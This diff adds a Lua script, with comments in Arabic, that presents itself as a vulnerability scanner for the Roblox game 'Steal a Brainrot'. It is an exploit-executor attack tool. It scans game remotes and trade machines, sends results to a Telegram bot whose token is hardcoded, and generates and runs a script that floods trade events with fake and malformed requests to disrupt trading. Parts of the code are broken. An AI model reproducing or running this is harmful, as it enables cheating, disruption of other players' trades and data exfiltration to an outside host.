@@ -1,0 +1,379 @@
+--[[
+    Steal a Brainrot Advanced Vulnerability Scanner
+    المطور: خبير أمن Roblox
+    الإصدار: 1.0
+    التاريخ: 2026
+    
+    هذا السكربت يقوم بتحليل شامل للعبة Steal a Brainrot للبحث عن ثغرات أمنية
+    مع التركيز على أنظمة التداول الجديدة وإرسال النتائج إلى Telegram
+]]
+
+-- إعدادات Telegram
+local TELEGRAM_TOKEN = "8710046846:AAHSUtY60DHBfwJMXdhJIQGg-_izSTTWFTA"
+local TELEGRAM_CHAT_ID = "7647074891"
+
+-- وظيفة إرسال رسائل إلى Telegram
+local function sendToTelegram(message)
+    local url = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
+    local data = {
+        chat_id = TELEGRAM_CHAT_ID,
+        text = message,
+        parse_mode = "HTML"
+    }
+    
+    local success, response = pcall(function()
+        return game:HttpGet(url, true, {
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end)
+    
+    if not success then
+        warn("فشل إرسال الرسالة إلى Telegram: " .. tostring(response))
+        return false
+    end
+    
+    return true
+end
+
+-- وظيفة تشفير بسيطة (XOR)
+local function xorEncrypt(text, key)
+    local result = ""
+    for i = 1, #text do
+        local byte = string.byte(text, i)
+        local keyByte = string.byte(key, ((i - 1) % #key) + 1)
+        result = result .. string.char(bit32.bxor(byte, keyByte))
+    end
+    return result
+end
+
+-- وظيفة فك تشفير
+local function xorDecrypt(text, key)
+    return xorEncrypt(text, key) -- XOR هو عملية متناظرة
+end
+
+-- وظيفة تحليل RemoteEvents
+local function analyzeRemoteEvents()
+    local results = {}
+    local remoteEvents = {}
+    
+    -- البحث عن RemoteEvents في مساحات العمل المختلفة
+    for _, service in ipairs({game:GetService("Workspace"), game:GetService("ReplicatedFirst"), game:GetService("ReplicatedStorage")}) do
+        for _, obj in ipairs(service:GetDescendants()) do
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                table.insert(remoteEvents, {
+                    Name = obj.Name,
+                    Parent = obj.Parent:GetFullName(),
+                    Type = obj.ClassName
+                })
+            end
+        end
+    end
+    
+    -- تحليل كل RemoteEvent للبحث عن ثغرات
+    for _, remote in ipairs(remoteEvents) do
+        local vulnerabilities = {}
+        
+        -- التحقق من عدم وجود حماية
+        local parent = game:GetService("Workspace"):FindFirstChild(remote.Parent)
+        if parent then
+            local scripts = parent:FindFirstChildWhichIsA("Script", true)
+            if scripts then
+                local source = scripts.Source
+                if not source:find("require") or not source:find("Validate") then
+                    table.insert(vulnerabilities, "قد لا يحتوي على تحقق صحيح")
+                end
+            end
+        end
+        
+        table.insert(results, {
+            Remote = remote,
+            Vulnerabilities = vulnerabilities
+        })
+    end
+    
+    return results
+end
+
+-- وظيفة تحليل Trades Machines
+local function analyzeTradesMachines()
+    local results = {}
+    
+    -- البحث عن Trades Machines في اللعبة
+    for _, obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
+        if obj.Name:lower():find("trade") or obj.Name:lower():find("machine") then
+            local machineData = {
+                Name = obj.Name,
+                Location = obj:GetFullName(),
+                Type = obj.ClassName,
+                Vulnerabilities = {}
+            }
+            
+            -- تحليل المكونات الداخلية
+            for _, child in ipairs(obj:GetDescendants()) do
+                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+                    table.insert(machineData.Vulnerabilities, "يحتوي على RemoteEvent: " .. child.Name)
+                end
+                
+                if child:IsA("NumberValue") or child:IsA("IntValue") then
+                    if child.Name:lower():find("price") or child.Name:lower():find("cost") then
+                        table.insert(machineData.Vulnerabilities, "قيمة سعرية قد تكون قابلة للتلاعب: " .. child.Name)
+                    end
+                end
+            end
+            
+            table.insert(results, machineData)
+        end
+    end
+    
+    return results
+end
+
+-- وظيفة تحليل الثغرات العامة
+local function analyzeGeneralVulnerabilities()
+    local results = {}
+    
+    -- التحقق من الثغرات الشائعة
+    local antiCheat = game:GetService("Workspace"):FindFirstChild("AntiCheat") or game:GetService("ReplicatedFirst"):FindFirstChild("AntiCheat")
+    if not antiCheat then
+        table.insert(results, "اللعبة قد لا تحتوي على نظام حماية فعال")
+    end
+    
+    -- التحقق من ثغرات التحقق من البيانات
+    local playerScripts = game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
+    if playerScripts then
+        for _, script in ipairs(playerScripts:GetDescendants()) do
+            if script:IsA("LocalScript") then
+                local source = script.Source
+                if source:find("fire") or source:find("invoke") then
+                    table.insert(results, "قد يوجد LocalScript يرسل بيانات دون تحقق: " .. script:GetFullName())
+                end
+            end
+        end
+    end
+    
+    return results
+end
+
+-- الوظيفة الرئيسية للتحليل
+local function performAnalysis()
+    local analysisResults = {
+        Timestamp = os.date("%Y-%m-%d %H:%M:%S"),
+        GameId = game.GameId,
+        PlaceId = game.PlaceId,
+        RemoteEvents = analyzeRemoteEvents(),
+        TradesMachines = analyzeTradesMachines(),
+        GeneralVulnerabilities = analyzeGeneralVulnerabilities()
+    }
+    
+    -- تحويل النتائج إلى JSON
+    local jsonResults = game:GetService("HttpService"):JSONEncode(analysisResults)
+    
+    -- تشفير النتائج
+    local encryptedResults = xorEncrypt(jsonResults, "StealBrainrotKey2026")
+    
+    -- إرسال ملخص إلى Telegram
+    local summary = "<b>تحليل ثغرات Steal a Brainrot</b>\n\n"
+    summary = summary .. "<b>التاريخ:</b> " .. analysisResults.Timestamp .. "\n"
+    summary = summary .. "<b>معرف اللعبة:</b> " .. analysisResults.GameId .. "\n\n"
+    
+    summary = summary .. "<b>RemoteEvents المكتشفة:</b> " .. #analysisResults.RemoteEvents .. "\n"
+    summary = summary .. "<b>Trades Machines المكتشفة:</b> " .. #analysisResults.TradesMachines .. "\n"
+    summary = summary .. "<b>الثغرات العامة:</b> " .. #analysisResults.GeneralVulnerabilities .. "\n\n"
+    
+    -- إضافة تفاصيل عن الثغرات الخطيرة
+    for _, machine in ipairs(analysisResults.TradesMachines) do
+        if #machine.Vulnerabilities > 0 then
+            summary = summary .. "<b>ثغرات في " .. machine.Name .. ":</b>\n"
+            for _, vuln in ipairs(machine.Vulnerabilities) do
+                summary = summary .. "- " .. vuln .. "\n"
+            end
+            summary = summary .. "\n"
+        end
+    end
+    
+    sendToTelegram(summary)
+    
+    -- حفظ النتائج في ملف
+    writefile("StealBrainrotAnalysis_" .. os.time() .. ".txt", jsonResults)
+    
+    return analysisResults
+end
+
+-- بدء التحليل
+local results = performAnalysis()
+
+-- إظهار نتائج سريعة في وحدة التحكم
+print("=== تحليل ثغرات Steal a Brainrot ===")
+print("RemoteEvents المكتشفة:", #results.RemoteEvents)
+print("Trades Machines المكتشفة:", #results.TradesMachines)
+print("الثغرات العامة:", #results.GeneralVulnerabilities)
+print("تم حفظ النتائج المفصلة وإرسال ملخص إلى Telegram")
+
+-- وظيفة لتجميد التداول (بناءً على الثغرات المكتشفة)
+local function createTradeFreezeScript()
+    -- البحث عن الثغرات في Trades Machines
+    local vulnerableMachines = {}
+    
+    for _, machine in ipairs(analyzeTradesMachines()) do
+        if #machine.Vulnerabilities > 0 then
+            table.insert(vulnerableMachines, machine)
+        end
+    end
+    
+    if #vulnerableMachines == 0 then
+        sendToTelegram("لم يتم العثور على آلات تداول ضعيفة للتجربة")
+        return false
+    end
+    
+    -- إنشاء سكربت تجميد التداول
+    local tradeFreezeScript = [[
+        -- سكربت تجميد التداول لآلات Trades Machines 2026
+        -- تم تطويره بناءً على الثغرات المكتشفة
+        
+        local player = game.Players.LocalPlayer
+        local workspace = game.Workspace
+        
+        -- وظيفة تجميد التداول
+        local function freezeTrade(machineName)
+            local machine = workspace:FindFirstChild(machineName, true)
+            if not machine then
+                warn("لم يتم العثور على الآلة: " .. machineName)
+                return false
+            end
+            
+            -- البحث عن RemoteEvents المتعلقة بالتداول
+            for _, obj in ipairs(machine:GetDescendants()) do
+                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("submit")) then
+                    -- إرسال طلبات تداول متكررة ومزيفة
+                    for i = 1, 50 do
+                        obj:FireServer({
+                            item = "FakeItem" .. i,
+                            amount = math.random(1000, 9999),
+                            price = 0,
+                            target = "FakeTarget"
+                        })
+                        wait(0.1)
+                    end
+                    
+                    -- محاولة استغلال ثغرات التحقق
+                    obj:FireServer({
+                        item = nil,
+                        amount = -999999,
+                        price = "invalid_price",
+                        target = nil
+                    })
+                    
+                    return true
+                end
+            end
+            
+            return false
+        end
+        
+        -- تنفيذ تجميد التداول على الآلات الضعيفة
+    ]]
+    
+    -- إضافة أسماء الآلات الضعيفة إلى السكربت
+    for _, machine in ipairs(vulnerableMachines) do
+        tradeFreezeScript = tradeFreezeScript .. "\n        freezeTrade(\"" .. machine.Name .. "\")"
+    end
+    
+    -- إضافة قسم الإبلاغ عن النتائج
+    tradeFreezeScript = tradeFreezeScript .. [[
+        
+        -- إبلاغ عن النتائج
+        local successCount = 0
+        local totalMachines = 0
+        
+        for _, machine in ipairs(vulnerableMachines) do
+            totalMachines = totalMachines + 1
+            if freezeTrade(machine.Name) then
+                successCount = successCount + 1
+            end
+        end
+        
+        local message = "تم تجميد تداول " .. successCount .. " من " .. totalMachines .. " آلات"
+        print(message)
+        
+        -- إرسال تقرير إلى Telegram
+        local telegramUrl = "https://api.telegram.org/bot" .. TELEGRAM_TOKEN .. "/sendMessage"
+        local telegramData = {
+            chat_id = TELEGRAM_CHAT_ID,
+            text = "<b>تقرير تجميد التداول</b>\n\n" .. message,
+            parse_mode = "HTML"
+        }
+        
+        game:HttpGet(telegramUrl, true, {
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(telegramData)
+        })
+    ]]
+    
+    -- حفظ السكربت
+    local scriptName = "TradeFreezeScript_" .. os.time() .. ".lua"
+    writefile(scriptName, tradeFreezeScript)
+    
+    -- إرسال إشعار بالنجاح
+    local message = "<b>تم إنشاء سكربت تجميد التداول بنجاح</b>\n\n"
+    message = message .. "<b>اسم الملف:</b> " .. scriptName .. "\n"
+    message = message .. "<b>الآلات المستهدفة:</b> " .. #vulnerableMachines .. "\n"
+    
+    for _, machine in ipairs(vulnerableMachines) do
+        message = message .. "- " .. machine.Name .. "\n"
+    end
+    
+    sendToTelegram(message)
+    
+    return true
+end
+
+-- وظيفة لتنفيذ سكربت تجميد التداول
+local function executeTradeFreeze()
+    -- إنشاء السكربت أولاً
+    if not createTradeFreezeScript() then
+        return false
+    end
+    
+    -- تنفيذ السكربت
+    local success, error = pcall(function()
+        loadstring(game:HttpGet("file://" .. game:GetService("ReplicatedStorage"):FindFirstChild("TradeFreezeScript_" .. os.time() .. ".lua").Value))()
+    end)
+    
+    if not success then
+        sendToTelegram("فشل تنفيذ سكربت تجميد التداول: " .. tostring(error))
+        return false
+    end
+    
+    sendToTelegram("تم تنفيذ سكربت تجميد التداول بنجاح")
+    return true
+end
+
+-- وظيفة رئيسية لتنفيذ كل شيء
+local function runCompleteAnalysis()
+    -- إرسال رسالة بدء التحليل
+    sendToTelegram("<b>بدء التحليل الشامل للعبة Steal a Brainrot</b>\n\nسيتم تحليل الثغرات وإنشاء سكربت تجميد التداول...")
+    
+    -- تحليل اللعبة
+    local results = performAnalysis()
+    
+    -- إنشاء سكربت تجميد التداول
+    if executeTradeFreeze() then
+        sendToTelegram("<b>اكتمل التحليل بنجاح!</b>\n\nتم تحليل اللعبة بالكامل وإنشاء سكربت تجميد التداول بناءً على الثغرات المكتشفة.")
+    else
+        sendToTelegram("<b>اكتمل التحليل مع بعض المشاكل</b>\n\nتم تحليل اللعبة ولكن حدثت مشاكل أثناء إنشاء سكربت تجميد التداول.")
+    end
+    
+    return results
+end
+
+-- تشغيل التحليل الكامل
+runCompleteAnalysis()
+
+print("=== اكتمل تحليل Steal a Brainrot ===")
+print("تم إرسال النتائج إلى Telegram")
+print("تم إنشاء سكربت تجميد التداول")
